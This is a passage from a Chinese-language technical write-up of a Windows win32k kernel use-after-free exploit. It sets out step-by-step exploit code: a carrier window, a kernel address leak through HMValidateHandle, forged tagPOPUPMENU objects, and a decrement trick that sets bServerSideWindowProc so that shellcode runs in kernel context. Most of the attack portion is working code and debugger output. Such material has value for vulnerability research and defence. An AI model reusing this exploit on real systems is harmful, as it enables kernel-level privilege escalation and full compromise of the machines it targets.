    wndClass.cbWndExtra     = 0x200;
    wndClass.hInstance      = GetModuleHandleA(NULL);
    wndClass.lpszMenuName   = NULL;
    wndClass.lpszClassName  = L"WNDCLASSHUNT";
    RegisterClassExW(&wndClass);
    hWindowHunt = CreateWindowExW(0x00,
        L"WNDCLASSHUNT",
        NULL,
        WS_OVERLAPPED,
        0,
        0,
        1,
        1,
        NULL,
        NULL,
        GetModuleHandleA(NULL),
        NULL);
_创建用来作为利用载体的窗口对象的利用代码_
载体窗口对象 `hWindowHunt` 具有 `0x200` 字节大小的扩展区域，扩展区域紧随基础的 `tagWND`
对象其后，在利用代码中将用来伪造各种相关的内核用户对象，以使系统重新执行 `xxxMNEndMenuState` 期间，执行流能正常稳定地执行。
接下来通过 `HMValidateHandle` 内核对象地址泄露技术获取载体窗口对象的 `tagWND` 内核地址。窗口对象 `tagWND`
的头部结构是一个 `THRDESKHEAD` 成员结构体对象，完整的结构体定义如下：
    typedef struct _HEAD {
        HANDLE  h;
        DWORD   cLockObj;
    } HEAD, *PHEAD;
    typedef struct _THROBJHEAD {
        HEAD    head;
        PVOID   pti;
    } THROBJHEAD, *PTHROBJHEAD;
    typedef struct _DESKHEAD {
        PVOID   rpdesk;
        PBYTE   pSelf;
    } DESKHEAD, *PDESKHEAD;
    typedef struct _THRDESKHEAD {
        THROBJHEAD  thead;
        DESKHEAD    deskhead;
    } THRDESKHEAD, *PTHRDESKHEAD;
_结构体 THRDESKHEAD 的定义_
其中结构体 `DESKHEAD` 的成员域 `pSelf` 指向所属用户对象的内核首地址。因此通过该指针加上 `tagWND`
结构体的大小定位到当前窗口对象的扩展区域的内核地址。
根据代码分析，函数 `xxxMNEndMenuState` 在开始执行时调用函数 `MNEndMenuStateNotify`
用来在通知窗口对象所属线程和当前菜单状态所属线程不同的情况下，清理通知线程的线程信息对象的成员域 `pMenuState` 数值。然而不幸的是，由于伪造的
`tagPOPUPMENU` 对象已覆盖原有数据，因此需要继续伪造包括通知窗口对象在内的其他内核用户对象。
    PTHRDESKHEAD head = (PTHRDESKHEAD)xxHMValidateHandle(hWindowHunt);
    PBYTE pbExtra = head->deskhead.pSelf + 0xb0 + 4;
    pvHeadFake = pbExtra + 0x44;
    for (UINT x = 0; x thead.pti;
    SetWindowLongW(hWindowHunt, 0x50, (LONG)pti); // pti
_填充载体窗口对象扩展区域的利用代码_
将载体窗口对象的扩展区域预留 `4` 字节，将剩余 `0x1FC`
字节的内存区域全部填充为剩余内存区域的首地址，填充后的数值将作为各种对象成员域的句柄、引用计数或对象指针。
接下来将剩余内存区域 `+0x44` 字节偏移的内存数据作为伪造的内核用户对象头部结构，其地址被作为伪造的根弹出菜单 `tagPOPUPMENU`
对象的各个指针成员域的值。在利用代码的自定义阴影窗口消息处理函数 `xxxShadowWindowProc` 中替换原来的初始化 `MENUNAME`
字段缓冲区的利用代码：
    DWORD dwPopupFake[0xD] = { 0 };
    dwPopupFake[0x0] = (DWORD)0x00098208;  //->flags
    dwPopupFake[0x1] = (DWORD)pvHeadFake;  //->spwndNotify
    dwPopupFake[0x2] = (DWORD)pvHeadFake;  //->spwndPopupMenu
    dwPopupFake[0x3] = (DWORD)pvHeadFake;  //->spwndNextPopup
    dwPopupFake[0x4] = (DWORD)pvHeadFake;  //->spwndPrevPopup
    dwPopupFake[0x5] = (DWORD)pvHeadFake;  //->spmenu
    dwPopupFake[0x6] = (DWORD)pvHeadFake;  //->spmenuAlternate
    dwPopupFake[0x7] = (DWORD)pvHeadFake;  //->spwndActivePopup
    dwPopupFake[0x8] = (DWORD)0xFFFFFFFF;  //->ppopupmenuRoot
    dwPopupFake[0x9] = (DWORD)pvHeadFake;  //->ppmDelayedFree
    dwPopupFake[0xA] = (DWORD)0xFFFFFFFF;  //->posSelectedItem
    dwPopupFake[0xB] = (DWORD)pvHeadFake;  //->posDropped
    dwPopupFake[0xC] = (DWORD)0;
_更新的初始化 MENUNAME 缓冲区的利用代码_
其中例外的成员域 `ppopupmenuRoot` 和 `posSelectedItem` 被填充为 `0xFFFFFFFF`
以防止执行流误入歧途。由于伪造对象头部 `pvHeadFake` 指向的内存区域对应的成员域 `cLockObj`
具有极大的数值，因此在内核中各个针对该伪造对象的解锁和解引用函数调用都不足以使系统为其调用销毁对象的函数，因此异常将不会发生。
在函数 `xxxMNEndMenuState` 第二次执行期间，在原位置重新分配的伪造根弹出菜单 `tagPOPUPMENU` 对象在函数
`MNFreePopup` 中释放。
**内核地址泄露技术**
本分析中使用了 `HMValidateHandle` 内核地址泄露技术。在 `user32`
模块中，在操作一些用户对象时，为了提升效率以便于直接在用户模式获取目标用户对象的数据，系统提供了未导出的函数 `HMValidateHandle`
以供模块内部使用。
这个函数接收用户句柄和对象类型作为参数，在内部对参数进行验证，验证通过时则返回目标对象在当前进程桌面堆中映射的地址。该函数并未导出，但在一些导出函数中调用，例如
`IsMenu` 函数。该函数验证通过参数传入的句柄是否为菜单句柄。函数通过将句柄值和菜单类型枚举 `2`(`TYPE_MENU`) 传入函数
`HMValidateHandle` 调用，并判断函数返回值是否不为空，并返回判断的结果。
    .text:76D76F0E 8B FF          mov     edi, edi
    .text:76D76F10 55             push    ebp
    .text:76D76F11 8B EC          mov     ebp, esp
    .text:76D76F13 8B 4D 08       mov     ecx, [ebp+hMenu]
    .text:76D76F16 B2 02          mov     dl, 2
    .text:76D76F18 E8 73 5B FE FF call    @HMValidateHandle@8 ; HMValidateHandle(x,x)
    .text:76D76F1D F7 D8          neg     eax
    .text:76D76F1F 1B C0          sbb     eax, eax
    .text:76D76F21 F7 D8          neg     eax
    .text:76D76F23 5D             pop     ebp
    .text:76D76F24 C2 04 00       retn    4
_函数 IsMenu 的指令片段_
因此我们可以通过硬编码匹配的方式，从 `user32` 模块的导出函数 `IsMenu` 中查找并计算函数 `HMValidateHandle` 的地址。
    static PVOID(__fastcall *pfnHMValidateHandle)(HANDLE, BYTE) = NULL;
    VOID
    xxGetHMValidateHandle(VOID)
    {
        HMODULE hModule = LoadLibraryA("USER32.DLL");
        PBYTE pfnIsMenu = (PBYTE)GetProcAddress(hModule, "IsMenu");
        PBYTE Address = NULL;
        for (INT i = 0; i  dt win32k!tagWND
       +0x000 head             : _THRDESKHEAD
       +0x014 state            : Uint4B
       [...]
       +0x014 bDialogWindow    : Pos 16, 1 Bit
       +0x014 bHasCreatestructName : Pos 17, 1 Bit
       +0x014 bServerSideWindowProc : Pos 18, 1 Bit
_成员标志位 bServerSideWindowProc 在结构体中的位置_
通过研究发现，在创建普通窗口对象时，如果样式参数 `dwStyle` 和扩展样式参数 `dwExStyle` 都传值为 `0` 默认值，那么在内核中成员域
`bDialogWindow` 和 `bHasCreatestructName` 都将未被置位。因此可以借助这个特性，实现对目标关键标志位的置位。
在利用代码中填充载体窗口对象的扩展区域内存期间，增加通过内核地址泄露技术获取窗口对象成员域 `bDialogWindow` 的地址的调用：
    pvAddrFlags = *(PBYTE *)((PBYTE)xxHMValidateHandle(hWindowHunt) + 0x10) + 0x16;
_获取窗口对象成员域 bDialogWindow 地址的利用代码_
接着将在先前初始化的结构体 `SHELLCODE` 对象的成员域 `pfnWindProc` 起始地址设置为载体窗口对象 `hWindowHunt`
的消息处理函数：
    SetWindowLongW(hWindowHunt, GWL_WNDPROC, (LONG)pvShellCode->pfnWindProc);
_修改载体窗口对象消息处理函数的利用代码_
在利用代码的自定义阴影窗口消息处理函数 `xxxShadowWindowProc` 中初始化 `MENUNAME` 字段缓冲区数值时，将成员标志位
`bDialogWindow` 的地址减 `4` 字节偏移的地址作为伪造 `tagPOPUPMENU` 对象的某个窗口对象指针成员域（例如
`spwndPrevPopup` 成员域）的数值，使前面提到的三个标志位正好位于该指针成员域指向的“窗口对象”的锁计数成员域 `cLockObj` 的最低
3 比特位。
    dwPopupFake[0x4] = (DWORD)pvAddrFlags - 4; //->spwndPrevPopup
_更新伪造弹出菜单对象的 spwndPrevPopup 成员域的利用代码_
在函数 `xxxMNEndMenuState` 执行期间，系统为根弹出菜单对象的成员域 `spwndPrevPopup` 调用函数
`HMAssignmentUnlock` 以解除对目标窗口对象的赋值锁时，将直接对以成员标志位 `bDialogWindow` 地址起始的 32
位数值自减，这将使成员标志位 `bServerSideWindowProc` 置位：
       +0x014 bDialogWindow    : 0y1
       +0x014 bHasCreatestructName : 0y1
       +0x014 bServerSideWindowProc : 0y1
_成员标志位 bServerSideWindowProc 由于自减被置位_
由于成员标志位 `bServerSideWindowProc` 置位，载体窗口对象将获得在内核上下文直接执行窗口对象消息处理函数的能力。
**ShellCode**
ShellCode 函数代码将作为载体窗口对象的自定义消息处理函数在内核上下文直接执行。在构造 ShellCode
函数代码之前，首先对所需的数据进行初始化和赋值。
根据前面构造的利用代码，我们已实现漏洞触发后在函数 `xxxMNEndMenuState`
第二次执行期间不引发系统异常而成功执行，但第二次释放的根弹出菜单对象实际上是批量创建的普通窗口对象中某个窗口对象所属窗口类 `tagCLS` 对象的成员域
`lpszMenuName` 指向的缓冲区。这将导致在进程退出时销毁用户对象期间，系统在内核中释放目标窗口类对象成员域 `lpszMenuName`
时引发重复释放的异常，因此需要在 ShellCode 代码中将目标窗口类对象的成员域 `lpszMenuName` 置空。